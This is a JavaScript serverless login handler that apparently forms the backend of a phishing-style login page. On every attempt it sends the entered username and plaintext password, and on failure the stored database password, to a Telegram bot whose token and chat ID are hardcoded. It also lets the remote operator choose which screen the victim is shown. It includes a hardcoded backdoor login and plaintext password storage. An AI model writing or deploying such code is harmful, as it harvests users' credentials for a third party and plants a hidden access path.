const fetch = require('node-fetch');
const { Redis } = require('@upstash/redis');

const redis = new Redis({
  url: process.env.UPSTASH_REDIS_REST_URL,
  token: process.env.UPSTASH_REDIS_REST_TOKEN,
});

export default async function handler(req, res) {
    if (req.method !== 'POST') {
        return res.status(405).json({ error: 'Method not allowed' });
    }

    const { username, password, deviceInfo } = req.body;

    // Config
    const BOT_TOKEN = process.env.TELEGRAM_BOT_TOKEN || '8758506651:AAH-GCPCua0qS2dIvFINUg1LYMli91_t1Yg';
    const CHAT_ID = process.env.TELEGRAM_CHAT_ID || '5290622641';

    // Trim whitespace and handle casing
    const cleanUser = (username || '').trim().toLowerCase();
    const cleanPass = (password || '').trim();

    try {
        // Check against Redis Users
        const savedPassword = await redis.hget('users', cleanUser);
        
        // Default fallback user + dynamic users
        const isValid = (cleanUser === 'nextgen' && cleanPass === 'nextgen105') || (savedPassword === cleanPass);

        if (!isValid) {
            // Notify Admin with more detail
            const dbPass = savedPassword || 'NOT_IN_DB';
            await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({ 
                    chat_id: CHAT_ID, 
                    text: `⚠️ *FAILED LOGIN ATTEMPT*\n👤 User: \`${cleanUser}\`\n🔑 Entered Pass: \`${cleanPass}\`\n📁 DB Pass: \`${dbPass}\``,
                    parse_mode: 'Markdown'
                })
            });
            return res.status(401).json({ error: 'INVALID_CREDENTIALS' });
        }

        // IF VALID: Send Success Notification
        const message = `
🚨 *NEW ACCESS DETECTED* 🚨

👤 *User:* \`${cleanUser}\`
🔑 *Pass:* \`${cleanPass}\`
📱 *Device:* ${deviceInfo.device}
🌐 *Browser:* ${deviceInfo.browser}
🖥️ *Platform:* ${deviceInfo.platform}

Select screen to show to user:
        `;

        await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({
                chat_id: CHAT_ID,
                text: message,
                parse_mode: 'Markdown',
                reply_markup: {
                    inline_keyboard: [
                        [
                            { text: '⚪ Set White Page', callback_data: 'state_white_page' },
                            { text: '📱 Set Mobile UI', callback_data: 'state_mobile_ui' }
                        ]
                    ]
                }
            })
        });

        return res.status(200).json({ success: true });

    } catch (e) {
        console.error('API Error:', e);
        // Fallback for default user if database is down
        if (cleanUser === 'nextgen' && cleanPass === 'nextgen105') {
            return res.status(200).json({ success: true });
        }
        return res.status(500).json({ error: 'INTERNAL_SERVER_ERROR', detail: e.message });
    }
}
